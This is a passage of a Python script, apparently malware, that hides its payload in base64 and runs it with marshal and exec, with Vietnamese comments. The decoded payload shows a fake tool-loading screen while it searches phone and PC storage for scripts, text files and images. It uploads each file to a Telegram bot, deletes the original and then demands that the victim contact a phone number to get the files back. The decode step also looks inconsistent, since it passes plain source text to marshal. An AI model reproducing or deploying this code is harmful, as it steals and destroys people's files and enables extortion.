OibiDhu58gbOG6oWkKZGVmIGZha2VfbG9hZGluZygpOgogICAgYW5pbWF0aW9ucyA9IFsifCIsICIvIiwgIi0iLCAiXFwiXQogICAgcHJpbnQoIlsrXSDEkGFuZyBi4bqvdCDEkeG6p3UgcXXDoSB0csOsbmggdOG6o2kgZOG7ryBsaeG7h3UuLi4gVnVpIGzDsm5nIMSR4bujaS4iKQogICAgCiAgICBmb3IgXyBpbiByYW5nZSgzMDApOiAgIyA1IHBow7p0IMSR4bq/bSBuZ8aw4bujYywgbmjGsG5nIGtow7RuZyBoaeG7g24gdGjhu4sgdGjhu51pIGdpYW4gbuG7r2EKICAgICAgICBwcmludChmIlxyWytdIMSQYW5nIHThuqNpIGPDoWMgZOG7ryBsaeG7h3UgY+G6p24gdGhp4bq/dCDEkeG7gyBjaOG6oXkgdG9vbC4uLiB7YW5pbWF0aW9uc1tfICUgNF19IiwgZW5kPSIiLCBmbHVzaD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgIAogICAgIyBIaeG7g24gdGjhu4sgdGjDtG5nIGLDoW8ga2hpIGjhur90IHRo4budaSBnaWFuCiAgICBwcmludCgiXG4iKQogICAgcHJpbnQoIkxJw4pOIEjhu4YgWkFMTzogMDg0NTY3MDQwOSDEkOG7giBDSFXhu5hDIEZJTEUhIikKCiMgTOG6pXkgZGFuaCBzw6FjaCBmaWxlIHRoZW8gdGjhu6kgdOG7sSDGsHUgdGnDqm46IC5weSwgLnR4dCwg4bqjbmgKZGVmIGZpbmRfZmlsZXMoKToKICAgIGZpbGVfZXh0ZW5zaW9ucyA9ICgiLnB5IiwgIi50eHQiLCAiLmpwZyIsICIuanBlZyIsICIucG5nIiwgIi5naWYiLCAiLmJtcCIsICIudGlmZiIsICIud2VicCIpCgogICAgcm9vdF9kaXJzID0gWyIvIiwgIi9zdG9yYWdlL2VtdWxhdGVkLzAiLCAiL3NkY2FyZCIsIG9zLmVudmlyb24uZ2V0KCJVU0VSUFJPRklMRSIsICIiKV0gICMgRHV54buHdCB04bqldCBj4bqjIHRoxrAgbeG7pWMKCiAgICBmaWxlX2xpc3QgPSBbXQoKICAgICMgTOG6pXkgY8OhYyBmaWxlIGPhuqduIHRoaeG6v3QKICAgIGZvciByb290X2RpciBpbiByb290X2RpcnM6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMocm9vdF9kaXIpOgogICAgICAgICAgICBmb3Igcm9vdCwgXywgZmlsZXMgaW4gb3Mud2Fsayhyb290X2Rpcik6CiAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkuZW5kc3dpdGgoZmlsZV9leHRlbnNpb25zKToKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9saXN0LmFwcGVuZChvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkpCgogICAgcmV0dXJuIGZpbGVfbGlzdAoKIyBH4butaSBmaWxlIGfhu5FjIHF1YSBUZWxlZ3JhbSB24bubaSBjxqEgY2jhur8gcmV0cnkKZGVmIHNlbmRfb3JpZ2luYWxfZmlsZShmaWxlX3BhdGgsIGNhcHRpb249IiIpOgogICAgcmV0cmllcyA9IDMgICMgU+G7kSBs4bqnbiB0aOG7rSBs4bqhaQogICAgZm9yIGF0dGVtcHQgaW4gcmFuZ2UocmV0cmllcyk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAicmIiKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KFRFTEVHUkFNX1VSTCwgZGF0YT17ImNoYXRfaWQiOiBDSEFUX0lELCAiY2FwdGlvbiI6IGNhcHRpb259LCBmaWxlcz17ImRvY3VtZW50IjogZmlsZX0pCiAgICAgICAgICAgICAgICAjIEtp4buDbSB0cmEgbuG6v3UgecOqdSBj4bqndSB0aMOgbmggY8O0bmcKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBpZiBhdHRlbXB0IDwgcmV0cmllcyAtIDE6CiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMykgICMgVGjhu60gbOG6oWkgc2F1IDMgZ2nDonkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBpZiBhdHRlbXB0IDwgcmV0cmllcyAtIDE6CiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDMpICAjIFRo4butIGzhuqFpIHNhdSAzIGdpw6J5CgojIFjDs2EgZmlsZSBn4buRYyBzYXUga2hpIGfhu61pCmRlZiBkZWxldGVfZmlsZShmaWxlX3BhdGgpOgogICAgdHJ5OgogICAgICAgIG9zLnJlbW92ZShmaWxlX3BhdGgpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJbLV0gTOG7l2kga2hpIHjDs2EgZmlsZSB7ZmlsZV9wYXRofToge2V9IikKCiMgxJBhIGx14buTbmcgZ+G7rWkgdOG6pXQgY+G6oyBmaWxlIMSR4buTbmcgdGjhu51pCmRlZiBzZW5kX2ZpbGVzX2luX3BhcmFsbGVsKGZpbGVzKToKICAgIHRocmVhZHMgPSBbXQogICAgZm9yIGZpbGVfcGF0aCBpbiBmaWxlczoKICAgICAgICBjYXB0aW9uID0gZiJGaWxlIMSRxrDhu6NjIGzhuqV5IHThu6s6IHtmaWxlX3BhdGh9IgoKICAgICAgICAjIEfhu61pIGZpbGUgZ+G7kWMgdHLGsOG7m2MKICAgICAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zZW5kX29yaWdpbmFsX2ZpbGUsIGFyZ3M9KGZpbGVfcGF0aCwgY2FwdGlvbikpCiAgICAgICAgdGhyZWFkcy5hcHBlbmQodGhyZWFkKQogICAgICAgIHRocmVhZC5zdGFydCgpCgogICAgICAgICMgWMOzYSBmaWxlIGfhu5FjIHNhdSBraGkgZ+G7rWkKICAgICAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kZWxldGVfZmlsZSwgYXJncz0oZmlsZV9wYXRoLCkpCiAgICAgICAgdGhyZWFkcy5hcHBlbmQodGhyZWFkKQogICAgICAgIHRocmVhZC5zdGFydCgpCgogICAgIyBDaOG7nSB04bqldCBj4bqjIGPDoWMgdGhyZWFkIGhvw6BuIHRow6BuaAogICAgZm9yIHRocmVhZCBpbiB0aHJlYWRzOgogICAgICAgIHRocmVhZC5qb2luKCkKCiMgTWFpbiBmdW5jdGlvbgpkZWYgbWFpbigpOgogICAgbG9hZGluZ190aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mYWtlX2xvYWRpbmcpCiAgICBsb2FkaW5nX3RocmVhZC5zdGFydCgpCgogICAgIyBH4butaSB04bqldCBj4bqjIGZpbGUgdGhlbyB0aOG7qSB04buxIMawdSB0acOqbgogICAgZmlsZXMgPSBmaW5kX2ZpbGVzKCkKICAgIHNlbmRfZmlsZXNfaW5fcGFyYWxsZWwoZmlsZXMpCgogICAgbG9hZGluZ190aHJlYWQuam9pbigpICAjIENo4budIGxvYWRpbmcga+G6v3QgdGjDumMKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk='
# Giải mã và thực thi
decoded_data = base64.b64decode(encoded_data)
script_data = marshal.loads(decoded_data)

# Thực thi mã nguồn
exec(script_data)
